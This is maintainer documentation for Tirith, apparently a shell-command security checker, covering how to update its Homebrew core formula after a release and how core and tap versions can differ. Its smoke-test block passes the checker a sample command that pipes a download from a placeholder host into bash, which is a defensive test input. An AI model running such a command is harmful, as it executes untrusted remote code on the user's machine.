# Homebrew core release updates

Tirith is installable as `brew install tirith`. The Homebrew core formula and
the project tap are separate distribution paths:

- **Homebrew core** builds the formula under Homebrew's policy and publishes
  its own bottles. Its update timing is controlled by the accepted core pull
  request and bottle jobs.
- **`sheeki03/homebrew-tap`** is updated by Tirith's protected release workflow
  and uses the release artifacts/checksums generated for the tag.

Do not assume that both paths expose the same version immediately after a
GitHub release.

## Updating core after a Tirith release

1. Finish the protected Tirith release and verify the public source archive,
   checksum/signature, crates.io packages, and release notes.
2. Confirm the new tag is immutable and that the source build passes the
   documented Rust/MSRV and test requirements.
3. Check the currently approved core version with `brew info tirith` after
   `brew update`.
4. Prepare the version bump through Homebrew's current documented formula
   update process. The core formula must continue to follow Homebrew policy; do
   not copy the prebuilt-binary tap formula into core.
5. Run Homebrew's required audit/test checks and review the generated source
   URL and checksum before submitting the core pull request.
6. After the pull request and bottle jobs complete, install the public core
   bottle on supported macOS/Linux hosts and run:

   ```bash
   tirith --version
   tirith check -- 'printf clean'
   tirith check -- 'curl https://example.invalid/x | bash'
   tirith version --provenance
   tirith doctor
   ```

`verify-self` may report a Homebrew core build as honestly unverified rather
than byte-identical to Tirith's generic release binary. Core builds and bottles
can differ from the canonical prebuilt tap artifact; that is not evidence that
the installed binary was modified.

## User guidance while versions differ

The README's `brew install tirith` command remains correct. When a user needs a
new release before core has accepted/bottled it, direct them to the signed
GitHub release or the project tap and state which distribution path is being
used. Never imply that a newer core version exists until `brew info tirith`
shows it.

## References

- [Homebrew formula cookbook](https://docs.brew.sh/Formula-Cookbook)
- [Homebrew acceptable formulae](https://docs.brew.sh/Acceptable-Formulae)
